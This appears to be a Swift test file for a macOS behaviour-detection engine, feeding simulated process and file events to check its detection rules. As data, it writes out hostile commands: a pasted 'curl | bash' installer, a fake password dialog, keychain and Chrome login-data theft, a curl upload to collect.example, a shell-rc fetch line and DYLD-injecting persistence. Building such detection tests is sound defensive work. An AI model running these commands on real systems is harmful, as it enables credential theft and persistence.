import Foundation
import RampartShared
import RampartBehaviour
import AppKit

// Owned by the behaviour build agent. Add checks with check(cond, "name").
// Every "attack" below is a synthetic SecurityEvent (plain data); no command is executed.

/// Synthetic event driver.
final class BehaviourSim {
    let engine: BehaviourEngine
    var t = Date(timeIntervalSince1970: 1_800_000_000)
    var nextPid: Int32 = 2000
    var procs: [Int32: ProcessInfoLite] = [:]
    var detections: [Detection] = []

    init(_ engine: BehaviourEngine) { self.engine = engine }

    func feed(_ e: SecurityEvent) { detections += engine.process(e) }

    @discardableResult
    func exec(_ path: String, _ args: [String] = [], parent: Int32, team: String? = nil, dt: TimeInterval = 0.2,
              pid: Int32? = nil, detail: [String: String] = [:]) -> Int32 {
        t += dt
        let p = pid ?? { nextPid += 1; return nextPid }()
        let platform = path.hasPrefix("/System/") || path.hasPrefix("/usr/bin/") || path.hasPrefix("/bin/") || path.hasPrefix("/usr/sbin/") || path.hasPrefix("/sbin/") || path.hasPrefix("/usr/libexec/")
        let info = ProcessInfoLite(pid: p, ppid: parent, path: path, args: args.isEmpty ? [path] : [path] + args, uid: 501,
                                   teamID: team, isPlatformBinary: platform)
        procs[p] = info
        var d = detail; d["start"] = String(t.timeIntervalSince1970) + ".\(p)"
        feed(SecurityEvent(date: t, kind: .exec, process: info, path: path, detail: d, source: "test"))
        return p
    }

    func file(_ kind: SecurityEventKind, _ path: String, dest: String? = nil, by pid: Int32?, detail: [String: String] = [:], dt: TimeInterval = 0.05) {
        t += dt
        feed(SecurityEvent(date: t, kind: kind, process: pid.flatMap { procs[$0] }, path: path, destPath: dest, detail: detail, source: "test"))
    }

    func other(_ kind: SecurityEventKind = .other, by pid: Int32?, path: String? = nil, detail: [String: String], dt: TimeInterval = 0.2) {
        t += dt
        feed(SecurityEvent(date: t, kind: kind, process: pid.flatMap { procs[$0] }, path: path, detail: detail, source: "test"))
    }

    func exit(_ pid: Int32) {
        t += 0.1
        feed(SecurityEvent(date: t, kind: .other, process: procs[pid], detail: ["es_event": "exit"], source: "test"))
    }

    var ruleIDs: Set<String> {
        Set(detections.flatMap { $0.evidence.map { String($0.title.split(separator: " ").first ?? "") } })
    }
    var maxConfidence: Int { detections.map(\.confidence).max() ?? 0 }

    /// Standard session: launchd → Terminal → login → zsh. Returns zsh pid.
    func terminalSession() -> Int32 {
        exec("/sbin/launchd", parent: 0, pid: 1)
        let term = exec("/System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal", parent: 1)
        let login = exec("/usr/bin/login", ["-pf", "user"], parent: term)
        return exec("/bin/zsh", ["-zsh"], parent: login)
    }
}

/// Test signing oracle (stands in for RampartSigning).
let behaviourTestSigning: SigningProvider = { path in
    if path.hasPrefix("/System/") || path.hasPrefix("/usr/bin/") || path.hasPrefix("/bin/") || path.hasPrefix("/usr/sbin/") || path.hasPrefix("/sbin/") || path.hasPrefix("/usr/libexec/") {
        return SigningInfo(status: .apple)
    }
    if path.hasPrefix("/Applications/") { return SigningInfo(status: .developerID, teamID: "EQHXZ8M8AV", notarized: true) }
    if path.hasPrefix("/opt/homebrew/") || PathClass.isDeveloperToolchain(path) { return SigningInfo(status: .adHoc) }
    if path.hasPrefix("/tmp/") || path.hasPrefix("/private/tmp/") || path.hasPrefix("/Users/Shared/") || path.contains("/Downloads/") { return SigningInfo(status: .unsigned) }
    return nil
}

extension SelfTest {
    static func behaviour() {
        let fm = FileManager.default
        let scratch = (ProcessInfo.processInfo.environment["RAMPART_SCRATCH"] ?? NSTemporaryDirectory())
            + "/rampart-behaviour-\(UUID().uuidString.prefix(8))"
        try? fm.createDirectory(atPath: scratch, withIntermediateDirectories: true)
        defer { try? fm.removeItem(atPath: scratch) }
        let home = NSHomeDirectory()

        // --- Rule file ---
        let rs = RuleSet.default
        let problems = rs.validate()
        check(problems.isEmpty, "rule set validates: \(problems.prefix(3))")
        let catalogue = Set(rs.rules.map(\.id).filter { $0.hasPrefix("R") && $0.count == 3 && Int($0.dropFirst()) != nil })
        check(catalogue.count >= 56, "≥56 of the 58 catalogue rules present (\(catalogue.count))")
        print("   rules: \(rs.rules.count) total, \(catalogue.count) catalogue IDs")

        // --- Entropy helpers ---
        var rng = SystemRandomNumberGenerator()
        let random = Data((0..<8192).map { _ in UInt8.random(in: 0...255, using: &rng) })
        let text = Data(String(repeating: "The quick brown fox jumps over the lazy dog. ", count: 200).utf8)
        check(RansomwareDetector.shannonEntropy(random) > 7.9, "random entropy ~8")
        check(RansomwareDetector.shannonEntropy(text) < 5, "text entropy low")
        check(RansomwareDetector.looksEncrypted(random), "random looks encrypted")
        check(!RansomwareDetector.looksEncrypted(text), "text not encrypted")
        check(!RansomwareDetector.looksEncrypted(Data([0x50, 0x4B, 0x03, 0x04]) + random), "zip magic exempt")

        // --- Lineage + pid reuse ---
        do {
            let tr = ProcessTracker()
            let d0 = Date()
            func ev(_ pid: Int32, _ ppid: Int32, _ path: String, start: String?, _ dt: Double, kind: SecurityEventKind = .exec, detail: [String: String] = [:]) -> ProcessNode? {
                var d = detail; if let start { d["start"] = start }
                return tr.observe(SecurityEvent(date: d0.addingTimeInterval(dt), kind: kind,
                    process: ProcessInfoLite(pid: pid, ppid: ppid, path: path), path: path, detail: d, source: "t"))
            }
            _ = ev(100, 1, "/Applications/Safari.app/Contents/MacOS/Safari", start: "1", 0)
            _ = ev(200, 1, "/bin/zsh", start: "2", 0.1)
            let a = ev(300, 100, "/bin/sh", start: "3", 0.2)
            check(tr.ancestors(of: a!).first?.name == "Safari", "lineage parent resolved")
            let a2 = ev(300, 100, "/usr/bin/curl", start: "3", 0.3, detail: ["exec_replace": "1"])
            check(a2?.key == a?.key && a2?.images.count == 2, "exec in place keeps the same process")
            _ = tr.observe(SecurityEvent(date: d0.addingTimeInterval(0.4), kind: .other, process: ProcessInfoLite(pid: 300, ppid: 100, path: "/usr/bin/curl"), detail: ["exit": "1"], source: "t"))
            let b = ev(300, 200, "/bin/ls", start: "9", 0.5)
            check(b != nil && b!.key.gen == a!.key.gen + 1, "pid reuse after exit gets new generation")
            check(tr.ancestors(of: b!).first?.name == "zsh", "reused pid has new parent chain")
            let c = ev(300, 200, "/bin/cat", start: "10", 0.6)
            check(c!.key.gen == b!.key.gen + 1, "pid reuse detected from start-time change without exit")
            check(tr.node(a!.key)?.exitDate != nil, "old generation kept after exit")
            // fork creates a new generation for the child pid
            let parent = ev(400, 200, "/bin/bash", start: "11", 0.7)
            _ = tr.observe(SecurityEvent(date: d0.addingTimeInterval(0.8), kind: .other, process: ProcessInfoLite(pid: 400, ppid: 200, path: "/bin/bash"),
                                         detail: ["es_event": "fork", "child_pid": "300"], source: "t"))
            let forked = tr.liveNode(pid: 300)
            check(forked != nil && forked!.key.gen == c!.key.gen + 1 && forked!.parent == parent!.key, "fork child gets new gen and parent")
        }

        // --- Malicious 1: ClickFix → stealer chain ---
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
            sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": "Safari"])
            let bash = sim.exec("/bin/bash", ["-c", "curl -fsSL https://update-check.example/i.sh | bash"], parent: zsh)
            sim.exec("/usr/bin/curl", ["-fsSL", "-o", "/tmp/.x/update", "https://update-check.example/u"], parent: bash)
            sim.exec("/bin/chmod", ["+x", "/tmp/.x/update"], parent: bash)
            let up = sim.exec("/tmp/.x/update", parent: bash)
            sim.exec("/usr/bin/osascript", ["-e", "display dialog \"macOS needs your password\" default answer \"\" with hidden answer"], parent: up)
            sim.exec("/usr/bin/dscl", [".", "-authonly", "user", "x"], parent: up)
            sim.exec("/usr/bin/security", ["find-generic-password", "-wa", "Chrome"], parent: up)
            let cp = sim.exec("/bin/cp", ["\(home)/Library/Application Support/Google/Chrome/Default/Login Data", "/tmp/.x/c/"], parent: up)
            sim.file(.fileCreate, "/tmp/.x/c/Login Data", by: cp)
            sim.exec("/usr/bin/ditto", ["-c", "-k", "--sequesterRsrc", "/tmp/.x/c", "/tmp/.x/out.zip"], parent: up)
            sim.exec("/usr/bin/curl", ["-F", "f=@/tmp/.x/out.zip", "https://collect.example/up"], parent: up)
            let ids = sim.ruleIDs
            for r in ["R31", "R30", "L05", "R29", "R34", "R35", "R36", "R37", "R38", "R43", "R40"] {
                check(ids.contains(r), "stealer chain fires \(r)")
            }
            check(sim.detections.contains { $0.severity == .critical && $0.category == .infostealer }, "stealer chain is critical infostealer")
            check(Set(sim.detections.map(\.id)).count == 1, "whole chain is one story (\(Set(sim.detections.map(\.id)).count))")
            if let d = sim.detections.last { print("   stealer: \(d.name) conf=\(d.confidence) evidence=\(d.evidence.count)") }
            check(sim.detections.last?.evidence.contains { $0.detail.contains("Started by:") } ?? false, "evidence explains lineage")
        }

        // --- Malicious 2: browser → shell → interpreter chain; persistence via script lineage ---
        do {
            let la = scratch + "/LaunchAgents"
            try? fm.createDirectory(atPath: la, withIntermediateDirectories: true)
            let label = "com.rampart.test.\(UUID().uuidString)"
            let plist = la + "/\(label).plist"
            let obj: [String: Any] = ["Label": label, "ProgramArguments": ["/Users/Shared/.cache/agent", "--daemon"], "RunAtLoad": true,
                                      "EnvironmentVariables": ["DYLD_INSERT_LIBRARIES": "/Users/Shared/.cache/libhook.dylib"]]
            try? PropertyListSerialization.data(fromPropertyList: obj, format: .xml, options: 0).write(to: URL(fileURLWithPath: plist))
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim.exec("/sbin/launchd", parent: 0, pid: 1)
            let chrome = sim.exec("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", parent: 1)
            let sh = sim.exec("/bin/sh", ["-c", "python3 -c 'x'"], parent: chrome)
            let py = sim.exec("/usr/bin/python3", ["-c", "import os"], parent: sh)
            sim.file(.fileCreate, plist, by: py)
            sim.exec("/bin/launchctl", ["bootstrap", "gui/501", plist], parent: sh)
            let ids = sim.ruleIDs
            for r in ["L08", "R08", "R07", "R09"] { check(ids.contains(r), "browser chain / persistence fires \(r)") }
            check(sim.maxConfidence >= 90, "browser→script persistence reaches critical (\(sim.maxConfidence))")
        }

        // --- Malicious 3: ransomware ---
        do {
            let docs = scratch + "/Docs"
            try? fm.createDirectory(atPath: docs + "/a", withIntermediateDirectories: true)
            try? fm.createDirectory(atPath: docs + "/b", withIntermediateDirectories: true)
            let rw = RansomwareDetector(config: RansomwareConfig(protectedRoots: [docs]))
            let canaries = rw.plantCanaries(in: [docs])
            check(canaries.count == 2, "two canaries planted")
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning, ransomware: rw))
            let zsh = sim.terminalSession()
            let locker = sim.exec("/tmp/locker", parent: zsh)
            // R03: a real PDF-looking file rewritten with random data
            let pdf = docs + "/a/report.pdf"
            fm.createFile(atPath: pdf, contents: Data("%PDF-1.7\n".utf8) + text)
            sim.file(.fileCreate, pdf, by: nil)
            fm.createFile(atPath: pdf, contents: random)
            sim.file(.fileWrite, pdf, by: locker)
            // R02: burst of encrypted outputs
            for i in 0..<11 {
                let p = docs + "/\(i % 2 == 0 ? "a" : "b")/file\(i).dat"
                fm.createFile(atPath: p, contents: Data((0..<4096).map { _ in UInt8.random(in: 0...255, using: &rng) }))
                sim.file(.fileWrite, p, by: locker)
            }
            // R04: mass rename to one new extension
            for i in 0..<20 { sim.file(.fileRename, docs + "/a/doc\(i).txt", dest: docs + "/a/doc\(i).txt.locked", by: locker) }
            // R05: ransom notes
            for d in ["a", "b", "c", "d", "e"] { sim.file(.fileCreate, docs + "/\(d)/HOW_TO_RECOVER.txt", by: locker) }
            // R01: canary modified
            try? Data("encrypted".utf8).write(to: URL(fileURLWithPath: canaries[0]))
            sim.file(.fileWrite, canaries[0], by: locker)
            let ids = sim.ruleIDs
            for r in ["R01", "R02", "R03", "R04", "R05"] { check(ids.contains(r), "ransomware fires \(r)") }
            check(sim.detections.contains { $0.category == .ransomware && $0.severity == .critical }, "ransomware critical")
            // Canary touched without content change is not a hit
            let rw2 = RansomwareDetector(config: RansomwareConfig(protectedRoots: [docs]))
            let c2 = rw2.plantCanaries(in: [docs + "/b"])
            check(rw2.observe(SecurityEvent(kind: .fileClose, path: c2[0], detail: ["modified": "0"], source: "t"), actorKey: "x").isEmpty,
                  "unchanged canary read is not a hit")
        }

        // --- Malicious 4: quarantine strip then exec; keylogger; TCC burst; beacon; self-delete; R12 rc line ---
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            sim.exec("/usr/bin/xattr", ["-dr", "com.apple.quarantine", "\(home)/Downloads/FreeApp.app"], parent: zsh)
            let app = sim.exec("\(home)/Downloads/FreeApp.app/Contents/MacOS/FreeApp", parent: 1)
            check(sim.ruleIDs.contains("R27"), "quarantine strip then exec fires R27")
            sim.other(by: app, detail: ["type": "eventTap", "keyboard": "1"])
            check(sim.ruleIDs.contains("R48"), "untrusted keyboard tap fires R48")
            for s in ["kTCCServiceCamera", "kTCCServiceMicrophone", "kTCCServiceScreenCapture"] {
                sim.other(.tccRequest, by: app, detail: ["service": s])
            }
            check(sim.ruleIDs.contains("R52"), "TCC burst fires R52")
            for _ in 0..<8 { sim.other(.networkConnect, by: app, detail: ["remote_ip": "203.0.113.7", "remote_port": "443"], dt: 300) }
            check(sim.ruleIDs.contains("R41"), "first connection fires R41")
            check(sim.ruleIDs.contains("R46"), "fixed-interval connections fire R46")
            sim.file(.fileDelete, "\(home)/Downloads/FreeApp.app/Contents/MacOS/FreeApp", by: nil)
            check(sim.ruleIDs.contains("R58"), "self-deleting binary fires R58")
            let rc = scratch + "/.zshrc"
            try? "export PATH=$PATH:/opt/homebrew/bin\n".write(toFile: rc, atomically: true, encoding: .utf8)
            sim.engine.seedShellRC(rc)
            try? "export PATH=$PATH:/opt/homebrew/bin\ncurl -s https://x.example/p | sh &\n".write(toFile: rc, atomically: true, encoding: .utf8)
            sim.file(.fileWrite, rc, by: app)
            check(sim.ruleIDs.contains("R12"), "shell rc fetch line fires R12")
            sim.exec("/usr/bin/security", ["add-trusted-cert", "-d", "-r", "trustRoot", "/tmp/ca.pem"], parent: app)
            check(sim.ruleIDs.contains("R24"), "root cert add fires R24")
        }

        // --- Learning mode + allowlist ---
        do {
            var cfg = BehaviourConfig(); cfg.learningMode = true
            let sim = BehaviourSim(BehaviourEngine(config: cfg, signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let tool = sim.exec("/tmp/tool", parent: zsh)          // R29 weak → observation only
            check(sim.detections.isEmpty && sim.engine.observations.contains { $0.ruleID == "R29" }, "learning mode records weak hit without alerting")
            sim.exec("/usr/bin/security", ["find-generic-password", "-s", "Chrome Safe Storage"], parent: tool)
            check(sim.ruleIDs.contains("R36"), "alwaysActive R36 still fires in learning mode")

            let sim2 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            sim2.engine.allow(AllowEntry(teamID: "TEAMOK1234", note: "user allowed"))
            let z2 = sim2.terminalSession()
            let ok = sim2.exec("/Users/Shared/tool", parent: z2, team: "TEAMOK1234")
            sim2.exec("/usr/bin/security", ["find-generic-password", "-s", "Chrome Safe Storage"], parent: ok)
            check(sim2.detections.isEmpty, "allowlisted Team ID suppresses lineage rules")
        }

        // --- Benign 1: Homebrew install pasted from brew.sh ---
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
            sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": "Safari"])
            let bash = sim.exec("/bin/bash", ["-c", "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"], parent: zsh)
            sim.exec("/usr/bin/curl", ["-fsSL", "https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh"], parent: zsh)
            for tool in ["/usr/bin/uname", "/usr/bin/sw_vers", "/usr/sbin/sysctl", "/usr/bin/xcode-select"] { sim.exec(tool, ["-a"], parent: bash) }
            let sudo = sim.exec("/usr/bin/sudo", ["/bin/mkdir", "-p", "/opt/homebrew"], parent: bash)
            sim.exec("/bin/mkdir", ["-p", "/opt/homebrew"], parent: sudo)
            sim.exec("/usr/bin/git", ["clone", "https://github.com/Homebrew/brew", "/opt/homebrew"], parent: bash)
            let ruby = sim.exec("/opt/homebrew/Library/Homebrew/vendor/portable-ruby/current/bin/ruby", ["-W1", "brew.rb", "update"], parent: bash)
            for tool in ["/usr/bin/sw_vers", "/usr/bin/uname", "/usr/sbin/sysctl"] { sim.exec(tool, parent: ruby) }
            let curl = sim.exec("/usr/bin/curl", ["-o", "\(home)/Library/Caches/Homebrew/portable-ruby.tar.gz", "https://ghcr.io/v2/homebrew/x"], parent: ruby)
            sim.file(.fileCreate, "\(home)/Library/Caches/Homebrew/portable-ruby.tar.gz", by: curl)
            sim.exec("/usr/bin/tar", ["-xzf", "\(home)/Library/Caches/Homebrew/portable-ruby.tar.gz", "-C", "/opt/homebrew/Cellar"], parent: ruby)
            sim.file(.fileWrite, "\(home)/.zprofile", by: zsh, detail: ["added_lines": "eval \"$(/opt/homebrew/bin/brew shellenv)\""])
            let brew = sim.exec("/opt/homebrew/bin/brew", ["install", "wget"], parent: zsh)
            sim.exec("/opt/homebrew/Library/Homebrew/vendor/portable-ruby/current/bin/ruby", ["brew.rb", "install", "wget"], parent: brew)
            sim.exec("/opt/homebrew/bin/brew", ["services", "start", "postgresql"], parent: zsh)
            sim.file(.fileCreate, "\(home)/Library/LaunchAgents/homebrew.mxcl.postgresql@16.plist", by: ruby)
            check(sim.detections.isEmpty, "Homebrew install produces no detections (\(sim.ruleIDs.sorted()))")
        }

        // --- Benign 2: developer workflow without Xcode ---
        do {
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            let proj = "\(home)/src/app"
            let swiftp = sim.exec("/usr/bin/swift", ["build"], parent: zsh, detail: ["cwd": proj])
            let sb = sim.exec("/Library/Developer/CommandLineTools/usr/bin/swift-build", parent: swiftp)
            sim.exec("/Library/Developer/CommandLineTools/usr/bin/swift-frontend", ["-c", "main.swift"], parent: sb)
            sim.exec("/usr/bin/ld", ["-o", "\(proj)/.build/debug/app"], parent: sb)
            sim.file(.fileCreate, "\(proj)/.build/debug/app", by: sb)
            sim.exec("/usr/bin/codesign", ["--force", "--sign", "-", "\(proj)/.build/debug/app"], parent: zsh, detail: ["cwd": proj])
            let app = sim.exec("\(proj)/.build/debug/app", ["--selftest"], parent: zsh)
            sim.exec("/bin/sh", ["-c", "echo ok"], parent: app)
            sim.exec("/usr/bin/git", ["commit", "-m", "wip"], parent: zsh)
            let npm = sim.exec("/opt/homebrew/bin/node", ["/opt/homebrew/bin/npm", "install"], parent: zsh)
            let post = sim.exec("/bin/sh", ["-c", "node scripts/postinstall.js"], parent: npm)
            sim.exec("/opt/homebrew/bin/node", ["scripts/postinstall.js"], parent: post)
            let goRun = sim.exec("/opt/homebrew/bin/go", ["run", "main.go"], parent: zsh)
            sim.exec("/private/var/folders/xy/abc123/T/go-build998877/b001/exe/main", parent: goRun)
            sim.exec("/bin/sh", ["-c", "curl -sSf https://sh.rustup.rs | sh"], parent: zsh)
            sim.exec("/usr/bin/python3", ["-m", "venv", ".venv"], parent: zsh)
            sim.exec("/usr/bin/ssh-add", ["\(home)/.ssh/id_ed25519"], parent: zsh)
            sim.exec("/usr/bin/tar", ["-czf", "dist.tgz", "build/"], parent: zsh, detail: ["cwd": proj])
            sim.exec("/usr/bin/xattr", ["-l", "\(proj)/README.md"], parent: zsh)
            sim.exec("/bin/zsh", ["-c", "nohup ./server &"], parent: zsh)
            check(!sim.detections.contains { $0.confidence >= 60 }, "developer workflow raises no alerts (\(sim.ruleIDs.sorted()))")
            check(sim.detections.isEmpty, "developer workflow produces no detections at all (\(sim.ruleIDs.sorted()))")
        }

        // --- Developer toolchain locations (no hit unless quarantined or the story is already malicious) ---
        do {
            let devPaths = ["\(home)/src/app/.build-behaviour/debug/app", "\(home)/src/app/.build/arm64-apple-macosx/debug/app",
                            "\(home)/Library/Developer/Xcode/DerivedData/App-abc/Build/Products/Debug/App.app/Contents/MacOS/App",
                            "\(home)/src/rs/target/debug/tool", "\(home)/src/rs/target/aarch64-apple-darwin/release/tool",
                            "\(home)/src/web/node_modules/.bin/tsc", "\(home)/go/bin/gopls", "\(home)/.cargo/bin/cargo-watch"]
            check(devPaths.allSatisfy { PathClass.classify($0) == .developer }, "developer toolchain paths classified")
            check(PathClass.classify("\(home)/.hidden/agent") == .hidden && PathClass.classify("\(home)/target/notes.txt") == .home, "non-toolchain paths unaffected")
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            for p in devPaths { let x = sim.exec(p, ["--version"], parent: zsh); sim.exec("/bin/sh", ["-c", "echo hi"], parent: x) }
            check(sim.detections.isEmpty, "ad-hoc dev binaries in toolchain dirs: 0 detections (\(sim.ruleIDs.sorted()))")
            // Downloaded (quarantined) binary in a toolchain dir does count.
            sim.exec("\(home)/go/bin/fetched", parent: zsh, detail: ["quarantined": "1"])
            check(sim.ruleIDs.contains("R29"), "quarantined binary in toolchain dir fires R29")
            // Story already malicious: a toolchain binary joins the evidence.
            let sim2 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let z2 = sim2.terminalSession()
            sim2.exec("/usr/bin/osascript", ["-e", "display dialog \"Password\" default answer \"\" with hidden answer"], parent: z2)
            sim2.exec("\(home)/src/rs/target/debug/tool", parent: z2)
            check(sim2.ruleIDs.contains("R29") && sim2.ruleIDs.contains("R34"), "toolchain binary in malicious story fires R29")
        }

        // --- ClipboardFingerprint + R31 token overlap ---
        do {
            let salt = "test-salt"
            let fp = ClipboardFingerprint.fingerprint("curl -fsSL https://x.example/i.sh | /bin/bash", salt: salt)
            let parts = fp.split(separator: ",")
            check(parts.count == 4 && parts.allSatisfy { $0.count == 8 && $0.allSatisfy(\.isHexDigit) }, "fingerprint = 8-hex hashes per token (\(fp))")
            check(ClipboardFingerprint.tokens("curl -fsSL https://x.example/i.sh | /bin/bash") == ["curl", "-fssl", "https://x.example/i.sh", "bash"], "token normalisation")
            check(ClipboardFingerprint.fingerprint("a b", salt: "s1") != ClipboardFingerprint.fingerprint("a b", salt: "s2"), "salt changes hashes")
            check(!ClipboardFingerprint.bootSalt.isEmpty, "boot salt available")

            let pasted = "curl -fsSL https://update-check.example/i.sh | bash"
            func clip(_ sim: BehaviourSim, _ text: String, from app: String = "Safari") {
                let safari = sim.exec("/Applications/Safari.app/Contents/MacOS/Safari", parent: 1)
                sim.other(by: safari, detail: ["type": "clipboard", "class": "risky", "source_app": app,
                                               "clip_tokens": ClipboardFingerprint.fingerprint(text)])
            }
            let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let zsh = sim.terminalSession()
            clip(sim, pasted)
            sim.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: zsh)
            check(sim.ruleIDs.contains("R31"), "R31 fires on ≥60% token overlap with browser clipboard")
            check(sim.detections.last?.evidence.contains { $0.detail.contains("match a risky command copied from Safari") } ?? false, "R31 evidence explains overlap")

            let b1 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let bz = b1.terminalSession()
            clip(b1, pasted)
            b1.exec("/usr/bin/curl", ["-fsSL", "https://other.example/y"], parent: bz)   // only generic tokens shared
            b1.exec("/usr/bin/git", ["status"], parent: bz)
            check(!b1.ruleIDs.contains("R31"), "unrelated command after risky copy does not fire R31 (\(b1.ruleIDs.sorted()))")
            let b2 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let bz2 = b2.terminalSession()
            clip(b2, pasted)
            b2.t += 700
            b2.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: bz2)
            check(!b2.ruleIDs.contains("R31"), "clipboard expires after the 600 s window")
            let b4 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let bz4 = b4.terminalSession()
            clip(b4, pasted)
            b4.t += 540
            b4.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: bz4)
            check(b4.ruleIDs.contains("R31"), "R31 still matches 9 minutes after the copy")
            let b3 = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            let bz3 = b3.terminalSession()
            clip(b3, pasted, from: "Notes")
            b3.exec("/usr/bin/curl", ["-fsSL", "https://update-check.example/i.sh"], parent: bz3)
            check(!b3.ruleIDs.contains("R31"), "non-browser clipboard source does not arm R31")
        }

        // --- New telemetry fields: R33, R42, R44, R45, R47 ---
        do {
            func run(_ body: (BehaviourSim, Int32) -> Void) -> Set<String> {
                let sim = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
                sim.exec("/sbin/launchd", parent: 0, pid: 1)
                let agent = sim.exec("/tmp/.u/agent", parent: 1)
                body(sim, agent)
                return sim.ruleIDs
            }
            check(run { sim, _ in sim.exec("/System/Applications/Utilities/Script Editor.app/Contents/MacOS/Script Editor", parent: 1,
                                            detail: ["responsible_path": "/Applications/Safari.app/Contents/MacOS/Safari"]) }.contains("R33"),
                  "R33 fires from responsible_path")
            check(run { sim, _ in sim.exec("/bin/sh", ["-c", "id"], parent: 1, detail: ["responsible_path": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"]) }.contains("L08"),
                  "L08 fires from responsible_path")
            check(run { sim, a in sim.other(.networkConnect, by: a, detail: ["remote_ip": "149.154.167.220", "remote_port": "443"]) }.contains("R42"),
                  "R42 fires on Telegram IP range")
            check(run { sim, a in sim.other(.dnsQuery, by: a, detail: ["name": "api.telegram.org"]) }.contains("R42"), "R42 fires on DNS name")
            check(run { sim, a in sim.other(.networkConnect, by: a, detail: ["remote_ip": "198.51.100.9", "remote_port": "9050"]) }.contains("R44"),
                  "R44 fires on Tor port")
            check(run { sim, a in sim.other(.networkConnect, by: a, detail: ["remote_ip": "1.1.1.1", "remote_port": "443"]) }.contains("R45"),
                  "R45 fires on DoH resolver from untrusted program")
            check(run { sim, a in sim.other(.networkConnect, by: a, detail: ["listen": "1", "local_ip": "0.0.0.0", "remote_port": "4444"]) }.contains("R47"),
                  "R47 fires on untrusted listener on all interfaces")
            // Benign counterparts
            let benign = BehaviourSim(BehaviourEngine(signing: behaviourTestSigning))
            benign.exec("/sbin/launchd", parent: 0, pid: 1)
            let chrome = benign.exec("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", parent: 1)
            benign.other(.networkConnect, by: chrome, detail: ["remote_ip": "1.1.1.1", "remote_port": "443"])
            let tg = benign.exec("/Applications/Telegram.app/Contents/MacOS/Telegram", parent: 1)
            benign.other(.networkConnect, by: tg, detail: ["remote_ip": "149.154.167.220", "remote_port": "443"])
            let srv = benign.exec("/Applications/Docker.app/Contents/MacOS/com.docker.backend", parent: 1)
            benign.other(.networkConnect, by: srv, detail: ["listen": "1", "local_ip": "0.0.0.0"])
            check(benign.detections.isEmpty, "browser DoH / Telegram app / signed listener: 0 detections (\(benign.ruleIDs.sorted()))")
        }

        // --- R19 Dock tile hijack ---
        do {
            func tile(_ label: String, _ bid: String, _ path: String) -> [String: Any] {
                ["tile-type": "file-tile", "tile-data": ["file-label": label, "bundle-identifier": bid,
                 "file-data": ["_CFURLString": URL(fileURLWithPath: path).absoluteString + "/", "_CFURLStringType": 15]]]
            }
            let plist: [String: Any] = ["persistent-apps": [
                tile("Safari", "com.apple.Safari", "/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app"),
                tile("Google Chrome", "com.google.Chrome", "/Applications/Google Chrome.app"),
                tile("Google Chrome", "com.google.Chrome", "/Users/Shared/.cache/Google Chrome.app"),
                tile("Notes", "com.apple.Notes", "/Applications/Notes.app"),
            ]]
            let data = try! PropertyListSerialization.data(fromPropertyList: plist, format: .binary, options: 0)
            let ids = ["/Applications/Notes.app": "com.evil.notes", "/Applications/Google Chrome.app": "com.google.Chrome",
                       "/System/Volumes/Preboot/Cryptexes/App/System/Applications/Safari.app": "com.apple.Safari"]
            let recs = PersistenceScanner.parseDock(data: data, plistPath: "/x/com.apple.dock.plist", home: home, bundleIDAt: { ids[$0] })
            check(recs.count == 4, "dock tiles parsed")
            check(recs.filter { $0.attributes["dockProblem"] != nil }.count == 2, "two hijacked tiles flagged")
            let dets = BehaviourEngine(signing: behaviourTestSigning).evaluatePersistence(added: recs)
            let r19 = dets.filter { $0.evidence.contains { $0.title.hasPrefix("R19") } }
            check(r19.count == 2 && r19.allSatisfy { $0.confidence >= 60 }, "R19 alerts for outside-path and bundle-ID mismatch (\(r19.map(\.confidence)))")
            let dockPath = home + "/Library/Preferences/com.apple.dock.plist"
            if let d = fm.contents(atPath: dockPath) {
                let live = PersistenceScanner.parseDock(data: d, plistPath: dockPath, home: home)
                check(!live.isEmpty && live.allSatisfy { $0.attributes["dockProblem"] == nil }, "this Mac's Dock has no hijacked tiles (\(live.count) tiles)")
            }
        }

        // --- Parsers on fixture strings ---
        do {
            let btm = """
            ========================
             Records for UID 501 : 8A908F12-CFCA-4ED9-B1B0-B705570C8D61
            ========================
             Items:
             #1:
                             UUID: 11111111-0000-0000-0000-000000000001
                             Name: Docker
                   Developer Name: Docker
                             Type: developer (0x20)
             #2:
                             UUID: 11111111-0000-0000-0000-000000000002
                             Name: com.docker.vmnetd
                  Team Identifier: 9BNSXJN65R
                             Type: legacy daemon (0x10010)
                      Disposition: [enabled, allowed, notified] (0xb)
                       Identifier: 16.com.docker.vmnetd
                              URL: /Library/LaunchDaemons/com.docker.vmnetd.plist
                  Executable Path: /Library/PrivilegedHelperTools/com.docker.vmnetd
             #3:
